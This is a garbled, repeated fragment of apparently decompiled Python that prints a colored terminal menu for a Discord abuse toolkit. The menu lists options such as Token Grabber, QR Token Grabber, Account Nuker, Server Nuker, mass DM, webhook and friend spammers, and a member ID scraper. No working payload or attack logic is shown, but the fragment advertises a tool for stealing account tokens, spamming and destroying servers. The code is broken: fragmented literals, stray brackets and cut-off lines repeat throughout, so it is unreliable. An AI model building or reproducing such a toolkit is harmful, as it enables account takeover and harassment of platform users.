'][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['32'][f'''{Fore.RESET}''']
        []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['32']
        []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']
        []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       